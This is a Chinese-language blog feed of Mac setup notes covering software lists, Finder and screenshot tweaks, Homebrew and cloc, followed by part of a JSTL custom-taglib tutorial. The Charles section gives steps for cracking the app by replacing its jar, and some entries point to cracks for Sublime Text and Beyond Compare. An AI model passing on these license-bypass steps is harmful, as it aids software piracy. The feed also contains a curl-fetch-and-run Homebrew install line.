class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/mysql-5.6.27-osx10.8-x86_64/bin</span><br><span class="line">sudo ./mysqld_safe</span><br><span class="line">./mysqladmin -u root password 新密码</span><br></pre></td></tr></table></figure><p>参见：</p><ul><li><a href="http://2484055.blog.51cto.com/2474055/1335382">MySQL for Mac 安装和基本操作(包含后期的环境变量设置)</a></li><li><a href="http://stackoverflow.com/questions/26110314/mysqlstartupitem-pkg-missing-from-mysql-dmg">MySQLStartupItem.pkg missing from MySQL DMG</a></li></ul><h3 id="8-mysql-workbench"><a href="#8-mysql-workbench" class="headerlink" title="8. mysql workbench"></a>8. mysql workbench</h3><h3 id="9-JD-GUI"><a href="#9-JD-GUI" class="headerlink" title="9. JD-GUI"></a>9. JD-GUI</h3><p>java class反编译工具</p><h3 id="10-charles"><a href="#10-charles" class="headerlink" title="10. charles"></a>10. charles</h3><p>简单说明下Charles的破解方法：<br>1.打开dmg镜像，将“Charles.app”拖入应用程序中；<br>2.打开应用程序—右键“Charles.app”显示包内容—Contents—Java；<br>3.将dmg镜像包内的“charles.jar”替换覆盖到第二步的Java文件夹中；<br>4.打开“Charles.app”，等待30秒，菜单栏中找到“Help”—“Register…”，输入任意信息完成注册；<br>5.Have done！</p><p>系统版本要求：OS X 10.7 或更高。<br>参见：<a href="http://www.sdifenzhou.com/charles4.html">Charles 4.0 Mac破解版</a></p><h2 id="三、系统配置"><a href="#三、系统配置" class="headerlink" title="三、系统配置"></a>三、系统配置</h2><h3 id="1-截图快捷键"><a href="#1-截图快捷键" class="headerlink" title="1. 截图快捷键"></a>1. 截图快捷键</h3><p>Cmd+Shift+3：全屏截图；截取整个屏幕，保存截图至桌面文件夹。<br>Cmd+Shift+4：区域截图；鼠标光标变成带坐标的小十字，通过拖拽截取特定区域，保存截图至桌面文件夹。<br>Cmd+Shift+4：单击空格键 - 鼠标单击指定窗口：窗口截图；出现小十字光标后对指定窗口按空格键，鼠标光标变成照相机，鼠标单击截取指定窗口，保存截图至桌面文件夹。<br>参见：<a href="http://www.zhihu.com/question/19550327/answer/12222576">OS X 系统自带的截图快捷键有哪些？</a></p><h3 id="2-时间显示设置"><a href="#2-时间显示设置" class="headerlink" title="2. 时间显示设置"></a>2. 时间显示设置</h3><p>右上角托盘设置。<br><img src="http://7xkl4i.com1.z0.glb.clouddn.com/mac%E6%97%B6%E9%97%B4%E6%98%BE%E7%A4%BA%E8%AE%BE%E7%BD%AE.png" alt="mac时间显示设置"></p><h3 id="3-更改功能键行为"><a href="#3-更改功能键行为" class="headerlink" title="3. 更改功能键行为"></a>3. 更改功能键行为</h3><p><img src="http://7xkl4i.com1.z0.glb.clouddn.com/mac%E6%9B%B4%E6%94%B9%E5%8A%9F%E8%83%BD%E9%94%AE%E8%A1%8C%E4%B8%BA.png" alt="mac更改功能键行为"></p><p>如果希望将顶部一行按键用作标准功能键（而不执行图标指示的特殊功能），但又不想按 Fn 键，请执行以下操作：<br>（1）从 Apple 菜单中，选取系统偏好设置。<br>（2）从显示菜单中，选取键盘（在 Mac OS X v10.5.8 或更早版本中，则为键盘与鼠标）。<br>（3）点按“键盘”（如果需要的话）。<br>（4）启用“将 F1、F2 等键用作标准功能键”。<br>启用此选项时，顶部一行按键将用作标准功能键 (F1 - F12)，而不执行音量控制等特殊功能。启用此选项后，若要使用任一上述按键上所印图标指示的功能，请按 Fn。例如，如果启用了上述选项，请按 Fn-F10 来开关静音功能。</p><p>参见：<a href="https://support.apple.com/zh-cn/HT3399">Mac OS X：如何更改功能键的行为</a></p><h3 id="4-申请Apple-ID"><a href="#4-申请Apple-ID" class="headerlink" title="4. 申请Apple ID"></a>4. 申请Apple ID</h3><p>到App Store里创建</p><h3 id="5-文件剪切"><a href="#5-文件剪切" class="headerlink" title="5. 文件剪切"></a>5. 文件剪切</h3><p>你只需选中目标文件，然后使用 Command+C 复制，然后用 Command +Option+V 将其移动到目标目录。</p><p><a href="http://sspai.com/28389">Mac 教程：OS X「剪切」移动文件的三种方法</a></p><h3 id="6-显示隐藏文件-未尝试"><a href="#6-显示隐藏文件-未尝试" class="headerlink" title="6. 显示隐藏文件(未尝试)"></a>6. 显示隐藏文件(未尝试)</h3><p>Mac 可以用命令行显示默认隐藏的文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowAllFiles TRUE</span><br><span class="line">killall Finder</span><br></pre></td></tr></table></figure><p>参见：<a href="http://www.appinn.com/showorhide/">ShowOrHide – 开关隐藏文件的显示[Mac]</a></p><h3 id="7-新建位于文件夹位置的终端窗口"><a href="#7-新建位于文件夹位置的终端窗口" class="headerlink" title="7. 新建位于文件夹位置的终端窗口"></a>7. 新建位于文件夹位置的终端窗口</h3><p><a href="http://apple.stackexchange.com/a/42450/40485">http://apple.stackexchange.com/a/42450/40485</a></p><p>系统偏好设置 -&gt; 键盘 -&gt; 快捷键 -&gt; 服务，勾选「新建位于文件夹位置的终端窗口」（后面的键盘快捷键可以不选），然后在 Finder 里面选中文件夹右键菜单的「服务」下面就会有「新建位于文件夹位置的终端窗口」这一子菜单了。</p><p>参见：<a href="https://www.v2ex.com/t/81344">MAC OSX右键菜单能否添加类似于“在终端中打开当前目录”的快捷方式</a></p><h3 id="8-打印机"><a href="#8-打印机" class="headerlink" title="8. 打印机"></a>8. 打印机</h3><p>各公司打印机安装方式不一</p><h3 id="9-Mac怎么彻底关闭开机声音-粗略尝试不好用"><a href="#9-Mac怎么彻底关闭开机声音-粗略尝试不好用" class="headerlink" title="9. Mac怎么彻底关闭开机声音(粗略尝试不好用)"></a>9. Mac怎么彻底关闭开机声音(粗略尝试不好用)</h3><p>关闭开机声音：<code>sudo nvram SystemAudioVolume=%80</code><br>恢复开机声音：<code>sudo nvram -d SystemAudioVolume</code></p><p>参见：<a href="http://www.macx.cn/thread-2071828-1-1.html">使用终端命令 关闭Mac电脑开机启动音</a></p><h3 id="10-如何更改-OS-X-截图默认保存路径"><a href="#10-如何更改-OS-X-截图默认保存路径" class="headerlink" title="10. 如何更改 OS X 截图默认保存路径"></a>10. 如何更改 OS X 截图默认保存路径</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.screencapture location ~/Pictures/screenshots/</span><br><span class="line">killall SystemUIServer</span><br></pre></td></tr></table></figure><p>参见：</p><ul><li><a href="http://fduo.org/osx-screenshot-settings/">更改OS X默认的截图文件名及格式</a></li><li><a href="http://sspai.com/26327">如何更改 OS X 截图默认保存路径</a></li></ul><h3 id="11-Finder标题栏显示当前文件夹路径"><a href="#11-Finder标题栏显示当前文件夹路径" class="headerlink" title="11. Finder标题栏显示当前文件夹路径"></a>11. Finder标题栏显示当前文件夹路径</h3><h4 id="标题栏显示当前文件夹路径"><a href="#标题栏显示当前文件夹路径" class="headerlink" title="标题栏显示当前文件夹路径"></a>标题栏显示当前文件夹路径</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.finder _FXShowPosixPathInTitle -bool TRUE</span><br><span class="line">killall Finder</span><br></pre></td></tr></table></figure><h4 id="恢复默认设置"><a href="#恢复默认设置" class="headerlink" title="恢复默认设置"></a>恢复默认设置</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">defaults delete com.apple.finder _FXShowPosixPathInTitle</span><br><span class="line">killall Finder</span><br></pre></td></tr></table></figure><p>参见：<a href="http://www.macgg.com/archives/7824.html">[Mac]如何在Finder标题栏显示当前文件夹路径？</a></p><h3 id="12-邮件配置"><a href="#12-邮件配置" class="headerlink" title="12. 邮件配置"></a>12. 邮件配置</h3><p>各公司邮件服务器配置不一。</p><h3 id="13-配色"><a href="#13-配色" class="headerlink" title="13. 配色"></a>13. 配色</h3><h4 id="文件列表颜色"><a href="#文件列表颜色" class="headerlink" title="文件列表颜色"></a>文件列表颜色</h4><p>修改.bash_profile 或者 .profile，添加如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">alias ll=&quot;ls -al&quot;</span><br><span class="line">alias grep=&#x27;grep --color&#x27;</span><br><span class="line">alias egrep=&#x27;egrep --color&#x27;</span><br><span class="line">alias fgrep=&#x27;fgrep --color&#x27;</span><br><span class="line">alias tree=&quot;find . -print | sed -e &#x27;s;[^/]*/;|____;g;s;____|; |;g&#x27;&quot;</span><br><span class="line"></span><br><span class="line">export CLICOLOR=1</span><br><span class="line">export LSCOLORS=gxfxaxdxcxegedabagacad</span><br></pre></td></tr></table></figure><h4 id="vim着色"><a href="#vim着色" class="headerlink" title="vim着色"></a>vim着色</h4><p>修改.vimrc，添加如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syntax on</span><br></pre></td></tr></table></figure><h3 id="14-brew"><a href="#14-brew" class="headerlink" title="14. brew"></a>14. brew</h3><h4 id="安装HomeBrew"><a href="#安装HomeBrew" class="headerlink" title="安装HomeBrew"></a>安装HomeBrew</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure><h4 id="安装Homebrew-Cask"><a href="#安装Homebrew-Cask" class="headerlink" title="安装Homebrew Cask"></a>安装Homebrew Cask</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install caskroom/cask/brew-cask</span><br></pre></td></tr></table></figure><h3 id="15-tree"><a href="#15-tree" class="headerlink" title="15. tree"></a>15. tree</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install tree</span><br></pre></td></tr></table></figure><h3 id="16-wget"><a href="#16-wget" class="headerlink" title="16. wget"></a>16. wget</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install wget</span><br></pre></td></tr></table></figure><h3 id="17-禁止修改文件扩展名的警告"><a href="#17-禁止修改文件扩展名的警告" class="headerlink" title="17. 禁止修改文件扩展名的警告"></a>17. 禁止修改文件扩展名的警告</h3><p><strong>借助终端</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.finder FXEnableExtensionChangeWarning -bool <span class="literal">false</span></span><br><span class="line">killall Finder</span><br></pre></td></tr></table></figure><p><strong>界面设置</strong></p><blockquote><p>其实只要直接在 Finder 中按＂⌘,＂进入 Preferences，然后选择 “Advanced” – 取消 “Show warning before changing an extension” 前面的勾就可以了。</p></blockquote><p>参见：<a href="http://www.appinn.com/disablefile-extension-warning/">OS X 小技巧 – 禁止修改文件扩展名的警告[Mac]</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/mac.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、应用软件&quot;&gt;&lt;a href=&quot;#一、应用软件&quot; class=&quot;headerlink&quot; title=&quot;一、应用软件&quot;&gt;&lt;/a&gt;一、应用软件&lt;/h2&gt;&lt;h3 id=&quot;1-安装腾讯电脑管家&quot;&gt;&lt;a href=&quot;#1-安装腾讯电脑管家&quot; class=&quot;headerlink&quot; title=&quot;1. 安装腾讯电脑管家&quot;&gt;&lt;/a&gt;1. 安装腾讯电脑管家&lt;/h3&gt;&lt;p&gt;下载地址：&lt;a href=&quot;http://mac.guanjia.qq.com/&quot;&gt;http://mac.guanjia.qq.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;软件下载列表：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;百度云同步盘&lt;/li&gt;
&lt;li&gt;百度音乐&lt;/li&gt;
&lt;li&gt;微信&lt;/li&gt;
&lt;li&gt;QQ&lt;/li&gt;
&lt;li&gt;Evernote&lt;/li&gt;
&lt;li&gt;firefox&lt;/li&gt;
&lt;li&gt;chrome&lt;/li&gt;
&lt;li&gt;thunderbird&lt;/li&gt;
&lt;li&gt;Foxmail&lt;/li&gt;
&lt;li&gt;Thunder&lt;/li&gt;
&lt;li&gt;VirtualBox&lt;/li&gt;
&lt;li&gt;The Unarchiver&lt;/li&gt;
&lt;li&gt;搜狗五笔&lt;/li&gt;
&lt;li&gt;Sublime Text 2(需自行破解，参见：&lt;a href=&quot;http://myroot.lofter.com/post/15197d_4e94e1&quot;&gt;http://myroot.lofter.com/post/15197d_4e94e1&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;beyond compare(需自行破解)&lt;/li&gt;
&lt;li&gt;AirDroid&lt;/li&gt;
&lt;li&gt;iTerm&lt;/li&gt;
&lt;li&gt;欧路词典&lt;/li&gt;
&lt;li&gt;Snip&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="工具软件" scheme="http://yeshaoting.cn/categories/%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="小记" scheme="http://yeshaoting.cn/tags/%E5%B0%8F%E8%AE%B0/"/>
    
    <category term="装机" scheme="http://yeshaoting.cn/tags/%E8%A3%85%E6%9C%BA/"/>
    
    <category term="mac" scheme="http://yeshaoting.cn/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title>Mac装机软件</title>
    <link href="http://yeshaoting.cn/article/mac/Mac%E8%BD%AF%E4%BB%B6%E6%9B%B4%E6%96%B0%E4%B8%80/"/>
    <id>http://yeshaoting.cn/article/mac/Mac%E8%BD%AF%E4%BB%B6%E6%9B%B4%E6%96%B0%E4%B8%80/</id>
    <published>2015-12-29T09:56:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/logo/mac.png" alt="Mac icon"></p><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/logo/mac.png" class="img-logo img-center" /><h2 id="一、应用软件"><a href="#一、应用软件" class="headerlink" title="一、应用软件"></a>一、应用软件</h2><h2 id="二、命令工具"><a href="#二、命令工具" class="headerlink" title="二、命令工具"></a>二、命令工具</h2><h3 id="1-cloc"><a href="#1-cloc" class="headerlink" title="1. cloc"></a>1. cloc</h3><p>cloc(Count Lines of Code)，一款代码行统计工具。</p><h3 id="命令安装"><a href="#命令安装" class="headerlink" title="命令安装"></a>命令安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cloc                    # https://www.npmjs.com/package/cloc</span><br><span class="line">sudo apt-get install cloc              # Debian, Ubuntu</span><br><span class="line">sudo yum install cloc                  # Red Hat, Fedora</span><br><span class="line">sudo dnf install cloc                  # Fedora 22 or later</span><br><span class="line">sudo pacman -S cloc                    # Arch</span><br><span class="line">sudo pkg install cloc                  # FreeBSD</span><br><span class="line">sudo port install cloc                 # Mac OS X with MacPorts</span><br><span class="line">brew install cloc                      # Mac OS X with Homebrew</span><br><span class="line">choco install cloc                     # Windows with Chocolatey</span><br></pre></td></tr></table></figure><h4 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h4><p>顺便统计了某个项目目录下的代码行，效果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:java yeshaoting$ cloc ./</span><br><span class="line">     205 text files.</span><br><span class="line">     163 unique files.</span><br><span class="line">      69 files ignored.</span><br><span class="line"></span><br><span class="line">github.com/AlDanial/cloc v 1.70  T=1.05 s (130.4 files/s, 7699.2 lines/s)</span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line">Language                              files          blank        comment           code</span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line">XML                                     105             87            521           5983</span><br><span class="line">Maven                                     1             35              9            357</span><br><span class="line">JavaScript                                1             29             15            332</span><br><span class="line">Java                                      6             63              8            199</span><br><span class="line">HTML                                      6              6              0            105</span><br><span class="line">Markdown                                  1             35              0             88</span><br><span class="line">Freemarker Template                       2              2              0             41</span><br><span class="line">Velocity Template Language                2              2              0             38</span><br><span class="line">JSP                                       3              0              0             37</span><br><span class="line">Mustache                                  4              0              0             32</span><br><span class="line">Twig                                      3              1              0             31</span><br><span class="line">Handlebars                                2              0              0             22</span><br><span class="line">YAML                                      1              0              0              8</span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line">SUM:                                    137            260            553           7273</span><br><span class="line">----------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>参见：<a href="https://github.com/AlDanial/cloc">https://github.com/AlDanial/cloc</a></p><h3 id="2-tree"><a href="#2-tree" class="headerlink" title="2. tree"></a>2. tree</h3><p>命令行输出文件树形结构</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install tree</span><br></pre></td></tr></table></figure><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:examples yeshaoting$ tree</span><br><span class="line">.</span><br><span class="line">├── InMemoryPresentationsRepository.java</span><br><span class="line">├── PresentationsRepository.java</span><br><span class="line">├── controller</span><br><span class="line">│   └── PresentationsController.java</span><br><span class="line">├── model</span><br><span class="line">│   └── Presentation.java</span><br><span class="line">└── services</span><br><span class="line">    └── PresentationsService.java</span><br></pre></td></tr></table></figure><h3 id="3-wget"><a href="#3-wget" class="headerlink" title="3. wget"></a>3. wget</h3><h3 id="4-sqlmap"><a href="#4-sqlmap" class="headerlink" title="4. sqlmap"></a>4. sqlmap</h3><h3 id="5-mycli"><a href="#5-mycli" class="headerlink" title="5. mycli"></a>5. mycli</h3><h3 id="6-cheat"><a href="#6-cheat" class="headerlink" title="6. cheat"></a>6. cheat</h3><h3 id="7-innotop"><a href="#7-innotop" class="headerlink" title="7. innotop"></a>7. innotop</h3><h3 id="8-Mac-OSX-Copy-and-Paste-Commands"><a href="#8-Mac-OSX-Copy-and-Paste-Commands" class="headerlink" title="8. Mac OSX Copy and Paste Commands"></a>8. Mac OSX Copy and Paste Commands</h3><table><thead><tr><th>Command</th><th>Function</th></tr></thead><tbody><tr><td>pbcopy</td><td>Copy to Clipboard</td></tr><tr><td>pbpaste</td><td>Paste from Clipboard</td></tr></tbody></table><p>参见：<a href="http://sweetme.at/2013/11/17/copy-to-and-paste-from-the-clipboard-on-the-mac-osx-command-line/">Copy to and Paste From the Clipboard on the Mac OSX Command Line</a></p><h3 id="9-SHC"><a href="#9-SHC" class="headerlink" title="9. SHC"></a>9. SHC</h3><p>Shell script compiler</p><p>参见：<a href="https://neurobin.org/projects/softwares/unix/shc/">https://neurobin.org/projects/softwares/unix/shc/</a></p><h3 id="10-Oraji"><a href="#10-Oraji" class="headerlink" title="10. Oraji"></a>10. Oraji</h3><p>参见：<a href="https://neurobin.org/projects/softwares/unix/oraji/">https://neurobin.org/projects/softwares/unix/oraji/</a></p><h3 id="11-qshell"><a href="#11-qshell" class="headerlink" title="11. qshell"></a>11. qshell</h3><p><a href="https://github.com/qiniu/qshell">https://github.com/qiniu/qshell</a></p><p><a href="http://developer.qiniu.com/code/v6/tool/qshell.html">http://developer.qiniu.com/code/v6/tool/qshell.html</a></p><h2 id="三、下载网站"><a href="#三、下载网站" class="headerlink" title="三、下载网站"></a>三、下载网站</h2><p>brew命令下载：<a href="http://brewformulas.org/">http://brewformulas.org/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;http://o7kubqw1j.bkt.clouddn.com/asserts/images/logo/mac.png&quot; alt=&quot;Mac icon&quot;&gt;&lt;/p&gt;
&lt;img src=&quot;http://o7kubqw1j.bkt.clouddn.com/as</summary>
      
    
    
    
    <category term="工具软件" scheme="http://yeshaoting.cn/categories/%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="小记" scheme="http://yeshaoting.cn/tags/%E5%B0%8F%E8%AE%B0/"/>
    
    <category term="装机" scheme="http://yeshaoting.cn/tags/%E8%A3%85%E6%9C%BA/"/>
    
    <category term="mac" scheme="http://yeshaoting.cn/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title>自定义taglib</title>
    <link href="http://yeshaoting.cn/article/java/%E8%87%AA%E5%AE%9A%E4%B9%89taglib/"/>
    <id>http://yeshaoting.cn/article/java/%E8%87%AA%E5%AE%9A%E4%B9%89taglib/</id>
    <published>2015-12-29T07:59:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/javaee.png" class="img-logo img-center" /><h2 id="一、扩展函数库"><a href="#一、扩展函数库" class="headerlink" title="一、扩展函数库"></a>一、扩展函数库</h2><p>在taglib函数类中添加需要的函数randomElement、join等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> JSTL function ext</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yeshaoting</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2015-06-29 14:52:57</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FunctionsExt</span> <span class="keyword">extends</span> <span class="title">Functions</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * &lt;pre&gt;</span></span><br><span class="line"><span class="comment">   * jstl&#x27;s fn:join only works with String[]. This one is more general.</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * usage: $&#123;nc:join(values, &quot;, &quot;)&#125;</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@see</span> http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter</span></span><br><span class="line"><span class="comment">   * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">join</span><span class="params">(Object values, String seperator)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (values == <span class="keyword">null</span>)</span><br><span class="line">      <span class="keyword">return</span> StringUtils.EMPTY;</span><br><span class="line">    <span class="keyword">if</span> (values <span class="keyword">instanceof</span> Collection&lt;?&gt;)</span><br><span class="line">      <span class="keyword">return</span> StringUtils.join((Collection&lt;?&gt;) values, seperator);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (values <span class="keyword">instanceof</span> Object[])</span><br><span class="line">      <span class="keyword">return</span> StringUtils.join((Object[]) values, seperator);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> values.toString();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * get element from elementes by random</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> elements</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">randomElement</span><span class="params">(String[] elements)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ArrayUtils.isEmpty(elements)) &#123;</span><br><span class="line">      <span class="keyword">return</span> StringUtils.EMPTY;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> index = <span class="keyword">new</span> Random().nextInt(elements.length);</span><br><span class="line">    <span class="keyword">return</span> CollectionUtils.get(elements, index).toString();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="二、创建taglib-fn-ext-tld"><a href="#二、创建taglib-fn-ext-tld" class="headerlink" title="二、创建taglib fn-ext.tld"></a>二、创建taglib fn-ext.tld</h2><p>放置文件位置：/martinye-demo-spring-web/src/main/webapp/WEB-INF/taglib/fn-ext.tld</p><p>参考fn.tld内容修改：</p><ol><li>short-name改为我们自己的命令空间fnExt。</li><li>uri：<a href="http://demo.martinye.com/jsp/jstl/functions-ext">http://demo.martinye.com/jsp/jstl/functions-ext</a></li><li>定义functions，主要修改name, function-class, function-signature</li></ol><p>修改后的完整tld内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">taglib</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/j2ee&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>JSTL 1.1 functions ext library<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>JSTL functions ext<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tlib-version</span>&gt;</span>1.1<span class="tag">&lt;/<span class="name">tlib-version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">short-name</span>&gt;</span>fnExt<span class="tag">&lt;/<span class="name">short-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">uri</span>&gt;</span>http://demo.martinye.com/jsp/jstl/functions-ext<span class="tag">&lt;/<span class="name">uri</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span 